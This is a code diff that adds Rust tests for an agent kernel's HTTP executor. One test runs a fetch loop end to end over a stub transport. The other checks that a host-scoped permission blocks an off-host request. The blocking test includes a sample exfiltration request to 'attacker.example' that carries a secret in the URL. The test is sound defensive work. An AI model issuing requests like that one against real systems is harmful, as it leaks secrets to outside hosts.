@@ -706,4 +706,176 @@ mod tests {
         assert!(!exec.handles_family(effect_ct::MODEL));
         assert!(!exec.handles_family("embedding"));
     }
+
+    // ---- an agent RUNS a fetch loop end-to-end through the HttpExecutor (converted from the deleted
+    // http_agent_e2e integration test, operator no-integration-tests mandate — hermetic: a Session + a Rust
+    // reducer + the real HttpExecutor over a STUB transport, no network). Beyond the isolated
+    // effect-mapping units above: proves the reducer's Http effect drives the loop (fold → authorize →
+    // dispatch → EXECUTE → fold-result), the response body advances the agent, replay reconstructs the
+    // identical KV, and a SEC-F1 host-scoped grant denies an off-host fetch BEFORE the client. ----
+    use cdz_kernel::authz::Authorizer;
+    use cdz_kernel::effect::{Capability, EffectKind, ResourcePredicate};
+    use cdz_kernel::event::{ContentType, Event, EventBody};
+    use cdz_kernel::executor::CompositeExecutor;
+    use cdz_kernel::kernel::Session;
+    use cdz_kernel::kv::Kv;
+    use cdz_kernel::reducer::{FoldOutput, Reducer};
+
+    /// A canned-200 transport for the fetch loop (distinct from the effect-mapping `StubHttp` above): returns
+    /// `fetched <url>` as the body so the agent can read it back. Asserts the reducer emitted a GET.
+    struct CannedHttp;
+    #[async_trait::async_trait(?Send)]
+    impl HttpTransport for CannedHttp {
+        async fn request(
+            &self,
+            method: HttpMethod,
+            url: &str,
+            _headers: &[(String, String)],
+            _body: Option<&[u8]>,
+            _key: Hash,
+        ) -> Result<HttpResponse, EffectOutcome> {
+            assert_eq!(method, HttpMethod::Get, "the reducer emitted a GET");
+            Ok(HttpResponse {
+                status: 200,
+                headers: vec![("content-type".to_string(), "text/plain".to_string())],
+                body: format!("fetched {url}").into_bytes().into(),
+            })
+        }
+    }
+
+    /// A minimal agent that fetches a URL: on "go" it emits an `Http` effect; when the response comes back it
+    /// decodes the http-response, stashes the status + body, and marks itself `fetched`.
+    struct FetchAgent;
+    #[async_trait::async_trait(?Send)]
+    impl Reducer for FetchAgent {
+        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
+            match &event.body {
+                EventBody::Inbound { .. } => {
+                    kv.put(b"phase".to_vec(), b"fetching".to_vec());
+                    FoldOutput::with(vec![EffectRequest::new_with_family(
+                        effect_ct::HTTP,
+                        "https://ok.host/data",
+                        Some(Payload::Inline(encode_http_request("get", None).into())),
+                        Timeliness::Interactive,
+                    )])
+                }
+                EventBody::EffectResult {
+                    result: EffectOutcome::Ok(Some(Payload::Inline(payload))),
+                    ..
+                } => {
+                    let (status, _headers, body) =
+                        decode_http_response(payload).expect("result is a valid http-response");
+                    kv.put(b"status".to_vec(), status.to_string().into_bytes());
+                    kv.put(b"body".to_vec(), body);
+                    kv.put(b"phase".to_vec(), b"fetched".to_vec());
+                    FoldOutput::none()
+                }
+                _ => FoldOutput::none(),
+            }
+        }
+    }
+
+    fn fetch_go() -> EventBody {
+        EventBody::Inbound {
+            content_type: ContentType {
+                family: "message".into(),
+                version: 1,
+            },
+            payload: Payload::Inline(b"go".to_vec().into()),
+        }
+    }
+
+    /// Grant `Http` scoped to the one host (SEC-F1 SSRF/exfil guard — deny everything else).
+    fn host_cap() -> Authorizer {
+        Authorizer::new(vec![Capability {
+            kind: EffectKind::Http,
+            predicate: ResourcePredicate::HostIn(vec!["ok.host".into()]),
+        }])
+    }
+
+    #[tokio::test]
+    async fn agent_loop_runs_end_to_end_through_the_http_executor() {
+        let mut reducer = FetchAgent;
+        let mut exec = CompositeExecutor::new()
+            .with_effect(effect_ct::HTTP, Box::new(HttpExecutor::new(CannedHttp)));
+        let mut session = Session::genesis(
+            Hash::of(b"fetch-agent-v1"),
+            Hash::of(b"fetch-agent-v1-nonce"),
+        );
+
+        session
+            .deliver(fetch_go(), None, &mut FetchAgent, &host_cap(), &mut exec)
+            .await
+            .unwrap();
+
+        // The loop closed: the agent fetched, the executor performed the request, and the response body
+        // folded back and advanced the agent to `fetched`.
+        assert_eq!(session.kv().get(b"phase"), Some(&b"fetched"[..]));
+        assert_eq!(
+            String::from_utf8_lossy(session.kv().get(b"body").expect("body recorded")),
+            "fetched https://ok.host/data"
+        );
+        assert_eq!(session.open_effects(), 0);
+
+        // Replay-equivalence: the response is recorded, so replay reconstructs the identical KV without
+        // re-fetching.
+        let replayed = Session::replay(session.log().to_vec(), &mut reducer)
+            .await
+            .unwrap();
+        assert_eq!(replayed.snapshot().kv_root, session.snapshot().kv_root);
+    }
+
+    #[tokio::test]
+    async fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
+        // Deny-by-default / SEC-F1: the grant is for `ok.host`; an agent fetching a DIFFERENT host (an
+        // exfil/SSRF attempt) is denied at the gate — the client (a real network call) is never reached. A
+        // transport that panics if called proves the executor was never consulted.
+        struct MustNotCall;
+        #[async_trait::async_trait(?Send)]
+        impl HttpTransport for MustNotCall {
+            async fn request(
+                &self,
+                _m: HttpMethod,
+                _u: &str,
+                _h: &[(String, String)],
+                _b: Option<&[u8]>,
+                _k: Hash,
+            ) -> Result<HttpResponse, EffectOutcome> {
+                panic!("a denied Http effect must never reach the client");
+            }
+        }
+        struct ExfilAgent;
+        #[async_trait::async_trait(?Send)]
+        impl Reducer for ExfilAgent {
+            async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
+                if matches!(event.body, EventBody::Inbound { .. }) {
+                    FoldOutput::with(vec![EffectRequest::new_with_family(
+                        effect_ct::HTTP,
+                        "https://attacker.example/exfil?d=secret",
+                        None,
+                        Timeliness::Interactive,
+                    )])
+                } else {
+                    FoldOutput::none()
+                }
+            }
+        }
+        let mut exec = CompositeExecutor::new()
+            .with_effect(effect_ct::HTTP, Box::new(HttpExecutor::new(MustNotCall)));
+        let mut session = Session::genesis(
+            Hash::of(b"exfil-agent-v1"),
+            Hash::of(b"exfil-agent-v1-nonce"),
+        );
+        session
+            .deliver(fetch_go(), None, &mut ExfilAgent, &host_cap(), &mut exec)
+            .await
+            .unwrap();
+
+        // Denied at the gate → a denial is on the log and nothing left open.
+        assert!(session
+            .log()
+            .iter()
+            .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
+        assert_eq!(session.open_effects(), 0);
+    }
 }
